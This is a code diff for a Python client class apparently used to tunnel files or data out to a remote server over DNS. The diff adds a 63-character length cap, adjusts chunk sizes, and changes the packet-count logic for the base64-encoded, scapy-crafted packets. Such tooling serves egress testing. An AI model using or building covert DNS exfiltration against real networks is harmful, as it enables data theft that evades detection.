@@ -18,11 +18,14 @@ class Client:
     def __init__(self, cli_object):
         self.protocol = "dns"
         self.remote_server = cli_object.ip
+        #
+        self.max_length = 63
+        self.current_total = 0
         if cli_object.file is None:
             self.file_transfer = False
             self.length = 35
         else:
-            self.length = 10
+            self.length = 25
             if "/" in cli_object.file:
                 self.file_transfer = cli_object.file.split("/")[-1]
             else:
@@ -31,6 +34,7 @@ class Client:
     def transmit(self, data_to_transmit):
 
         byte_reader = 0
+        check_total = False
         packet_number = 1
 
         # Determine if sending via IP or domain name
@@ -45,15 +49,31 @@ class Client:
             total_packets = len(data_to_transmit) / self.length
         else:
             total_packets = (len(data_to_transmit) / self.length) + 1
+        self.current_total = total_packets
 
+        # While loop over the file or data to send
         while (byte_reader < len(data_to_transmit)):
             if not self.file_transfer:
                 encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
             else:
-                encoded_data = base64.b64encode(self.file_transfer +
-                    ".:|:." + str(packet_number) + "/" + str(total_packets) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
+                encoded_data = base64.b64encode(self.file_transfer + ".:|:." + str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
 
-            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(total_packets)
+                while len(encoded_data) > self.max_length:
+
+                    self.length -= 1
+                    # calcalate total packets
+                    if (((len(data_to_transmit) - byte_reader) % self.length) == 0):
+                        packet_diff = (len(data_to_transmit) - byte_reader) / self.length
+                    else:
+                        packet_diff = ((len(data_to_transmit) - byte_reader) / self.length)
+                    check_total = True
+                    encoded_data = base64.b64encode(self.file_transfer + ".:|:." + str(packet_number) + ".:|:." + data_to_transmit[byte_reader:byte_reader + self.length])
+
+                if check_total:
+                    self.current_total = packet_number + packet_diff
+                    check_total = False
+
+            print "[*] Packet Number/Total Packets:        " + str(packet_number) + "/" + str(self.current_total)
 
             # Craft the packet with scapy
             try:
